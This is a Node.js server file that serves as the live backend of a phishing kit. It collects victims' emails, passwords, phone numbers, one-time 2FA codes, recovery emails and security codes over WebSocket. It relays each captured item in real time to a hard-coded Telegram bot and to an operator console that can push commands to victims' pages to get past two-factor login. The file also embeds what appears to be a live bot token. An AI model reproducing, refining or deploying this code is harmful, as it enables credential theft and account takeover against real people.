// my_app — Session Relay Server
// Usage: node server.js
// Requires: npm install express ws

const TELEGRAM_TARGETS = [
  { token: '7739344847:AAE71sFrAesP80d_SgMajbdQLJM8t6ZaPx4', chatId: '6364557184' },
  { token: 'here', chatId: 'here' },
];

const express   = require('express');
const http      = require('http');
const WebSocket = require('ws');
const https     = require('https');

const app    = express();
const server = http.createServer(app);

const wss = new WebSocket.Server({
  server,
  verifyClient: () => true,
});

// ── CORS ───────────────────────────────────────────────────────
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin',  '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.use(express.static(__dirname));
app.get('/health', (_req, res) => res.json({ ok: true, ts: Date.now() }));

// ── State ──────────────────────────────────────────────────────
const clientsBySession = new Map();
const adminSockets     = new Set();
const sessionsInfo     = new Map();

// ── Helpers ────────────────────────────────────────────────────
function safeSend(ws, obj) {
  if (!ws || ws.readyState !== WebSocket.OPEN) return;
  try { ws.send(JSON.stringify(obj)); }
  catch (e) { console.error('[server] send error:', e.message); }
}

function broadcastToAdmins(obj) {
  for (const a of adminSockets) safeSend(a, obj);
}

function snapshotSessions() {
  const out = {};
  for (const [sid, info] of sessionsInfo) out[sid] = { ...info };
  return out;
}

function updateSession(sid, patch) {
  sessionsInfo.set(sid, {
    ...(sessionsInfo.get(sid) || {}),
    ...patch,
    lastSeen: Date.now(),
  });
}

function ts() { return new Date().toISOString(); }

// ── Telegram ───────────────────────────────────────────────────
// FIX: only check that the values are non-empty — never compare
// against specific strings, which breaks when real creds are filled in.
function sendTelegram(text) {
  TELEGRAM_TARGETS.forEach(({ token, chatId }) => {
    if (!token || !chatId) return;

    const body = JSON.stringify({
      chat_id:    chatId,
      text,
      parse_mode: 'HTML',
    });

    const options = {
      hostname: 'api.telegram.org',
      path:     `/bot${token}/sendMessage`,
      method:   'POST',
      headers:  {
        'Content-Type':   'application/json',
        'Content-Length': Buffer.byteLength(body),
      },
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => { data += chunk; });
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          if (!parsed.ok) console.error('[telegram] API error:', parsed.description);
          else console.log(`[telegram] sent (msg_id: ${parsed.result?.message_id})`);
        } catch(e) { console.error('[telegram] parse error:', e.message); }
      });
    });

    req.on('error', (e) => console.error('[telegram] request failed:', e.message));
    req.write(body);
    req.end();
  });
}

function notifyTelegram(sessionId, msg, sessionData) {
  const sid   = sessionId;
  const time  = new Date().toLocaleTimeString('en-GB', { hour12: false });
  const email = sessionData.email    || '—';
  const pw    = sessionData.password || '—';

  const map = {

    connect: () =>
      `👤 <b>New session started</b>\n` +
      `🕐 <b>Time:</b> ${time}\n` +
      `🆔 <b>Session:</b> <code>${sid}</code>`,

    email_submitted: () =>
      `📧 <b>Email captured</b>\n` +
      `🕐 <b>Time:</b> ${time}\n` +
      `🆔 <b>Session:</b> <code>${sid}</code>\n` +
      `📨 <b>Email:</b> <code>${msg.email}</code>`,

    password_submitted: () =>
      `🔑 <b>Password captured</b>\n` +
      `🕐 <b>Time:</b> ${time}\n` +
      `🆔 <b>Session:</b> <code>${sid}</code>\n` +
      `📨 <b>Email:</b> <code>${email}</code>\n` +
      `🔐 <b>Password:</b> <code>${msg.password}</code>`,

    phone_submitted: () =>
      `📱 <b>Phone number captured</b>\n` +
      `🕐 <b>Time:</b> ${time}\n` +
      `🆔 <b>Session:</b> <code>${sid}</code>\n` +
      `📨 <b>Email:</b> <code>${email}</code>\n` +
      `📞 <b>Phone:</b> <code>${msg.phone}</code>`,

    otp_submitted: () =>
      `🔢 <b>OTP / 2FA code captured</b>\n` +
      `🕐 <b>Time:</b> ${time}\n` +
      `🆔 <b>Session:</b> <code>${sid}</code>\n` +
      `📨 <b>Email:</b> <code>${email}</code>\n` +
      `🔑 <b>Password:</b> <code>${pw}</code>\n` +
      `🔢 <b>OTP:</b> <code>${msg.six_code}</code>`,

    recovery_submitted: () =>
      `📩 <b>Recovery email captured</b>\n` +
      `🕐 <b>Time:</b> ${time}\n` +
      `🆔 <b>Session:</b> <code>${sid}</code>\n` +
      `📨 <b>Email:</b> <code>${email}</code>\n` +
      `🔄 <b>Recovery email:</b> <code>${msg.recovery}</code>`,

    security_code_submitted: () =>
      `🛡️ <b>Security code captured</b>\n` +
      `🕐 <b>Time:</b> ${time}\n` +
      `🆔 <b>Session:</b> <code>${sid}</code>\n` +
      `📨 <b>Email:</b> <code>${email}</code>\n` +
      `🔒 <b>Security code:</b> <code>${msg.code}</code>`,
  };

  const builder = map[msg.type];
  if (builder) sendTelegram(builder());
}

// ── Trust proxy ────────────────────────────────────────────────
app.set('trust proxy', true);

// ── WebSocket handler ──────────────────────────────────────────
wss.on('connection', (ws, req) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
          || req.socket?.remoteAddress
          || 'unknown';

  console.log(`[${ts()}] connection from ${ip}`);
  ws.isAdmin   = false;
  ws.sessionId = null;

  ws.isAlive = true;
  ws.on('pong', () => { ws.isAlive = true; });

  ws.on('message', (raw) => {
    let msg;
    try { msg = JSON.parse(raw); }
    catch { console.warn('[server] invalid JSON from', ip); return; }
    if (!msg || !msg.type) return;

    if (msg.type === 'connect') {

      if (msg.admin === true || msg.role === 'admin') {
        ws.isAdmin = true;
        adminSockets.add(ws);
        console.log(`[${ts()}] admin registered from ${ip}`);
        safeSend(ws, { type: 'connected', role: 'admin' });
        safeSend(ws, { type: 'server_sessions', sessions: snapshotSessions() });
        return;
      }

      if (msg.sessionId) {
        ws.sessionId = msg.sessionId;
        clientsBySession.set(msg.sessionId, ws);
        updateSession(msg.sessionId, { lastEvent: 'connected' });
        console.log(`[${ts()}] client registered: ${msg.sessionId} from ${ip}`);

        notifyTelegram(msg.sessionId, msg, sessionsInfo.get(msg.sessionId) || {});

        safeSend(ws, {
          type:       'connected',
          role:       'client',
          sessionId:  msg.sessionId,
          adminCount: adminSockets.size,
        });
        broadcastToAdmins({
          type:      'client_connected',
          sessionId: msg.sessionId,
          lastSeen:  Date.now(),
        });
        return;
      }

      console.warn('[server] connect missing sessionId or admin flag');
      return;
    }

    if (!ws.isAdmin && ws.sessionId) {
      const patch = { lastEvent: msg.step || msg.type };
      if (msg.email)    patch.email    = msg.email;
      if (msg.password) patch.password = msg.password;
      if (msg.phone)    patch.phone    = msg.phone;
      if (msg.six_code) patch.six_code = msg.six_code;
      if (msg.recovery) patch.recovery = msg.recovery;
      if (msg.code)     patch.code     = msg.code;

      updateSession(ws.sessionId, patch);
      notifyTelegram(ws.sessionId, msg, sessionsInfo.get(ws.sessionId) || {});

      broadcastToAdmins({ ...msg, fromSession: ws.sessionId });
      console.log(`[${ts()}] relay ${ws.sessionId} → ${adminSockets.size} admin(s): ${msg.type}`);
      return;
    }

    if (ws.isAdmin) {
      const targetId = msg.sessionId || msg.target?.sessionId;

      if (targetId) {
        const clientWs = clientsBySession.get(targetId);
        if (clientWs && clientWs.readyState === WebSocket.OPEN) {
          safeSend(clientWs, msg);
          updateSession(targetId, { lastEvent: msg.type });
          broadcastToAdmins({
            type:      'session_updated',
            sessionId: targetId,
            ...sessionsInfo.get(targetId),
          });
          safeSend(ws, { type: 'ok', action: 'delivered', sessionId: targetId });
          console.log(`[${ts()}] admin → ${targetId}: ${msg.type}`);
        } else {
          safeSend(ws, { type: 'error', message: 'client_not_connected', sessionId: targetId });
          console.warn(`[${ts()}] target not connected: ${targetId}`);
        }
        return;
      }

      let count = 0;
      for (const [, clientWs] of clientsBySession) {
        if (clientWs.readyState === WebSocket.OPEN) { safeSend(clientWs, msg); count++; }
      }
      safeSend(ws, { type: 'ok', action: 'broadcasted', count });
      console.log(`[${ts()}] admin broadcast to ${count} client(s): ${msg.type}`);
    }
  });

  ws.on('close', () => {
    if (ws.isAdmin) {
      adminSockets.delete(ws);
      console.log(`[${ts()}] admin disconnected`);
    }
    if (ws.sessionId) {
      clientsBySession.delete(ws.sessionId);
      broadcastToAdmins({ type: 'client_disconnected', sessionId: ws.sessionId });
      console.log(`[${ts()}] client disconnected: ${ws.sessionId}`);
      setTimeout(() => {
        if (!clientsBySession.has(ws.sessionId)) sessionsInfo.delete(ws.sessionId);
      }, 30_000);
    }
  });

  ws.on('error', (e) => console.error(`[${ts()}] ws error:`, e.message));
});

// ── Heartbeat ─────────────────────────────────────────────────
const heartbeat = setInterval(() => {
  for (const ws of wss.clients) {
    if (!ws.isAlive) { ws.terminate(); continue; }
    ws.isAlive = false;
    try { ws.ping(); } catch (_) {}
  }
}, 25_000);

wss.on('close', () => clearInterval(heartbeat));

process.on('SIGTERM', () => { server.close(() => process.exit(0)); });
process.on('SIGINT',  () => { server.close(() => process.exit(0)); });

// ── Start ─────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n⚡  my_app relay server running`);
  console.log(`   Local     → http://localhost:${PORT}`);
  console.log(`   Network   → http://0.0.0.0:${PORT}`);
  console.log(`   my_app    → http://localhost:${PORT}/my_app.html`);
  console.log(`   Admin     → http://localhost:${PORT}/admin.html`);
  console.log(`   WebSocket → ws://localhost:${PORT}`);
  console.log(`   Health    → http://localhost:${PORT}/health`);
  console.log(`   Telegram  → ✅ ${TELEGRAM_TARGETS.length} target(s) configured\n`);

});

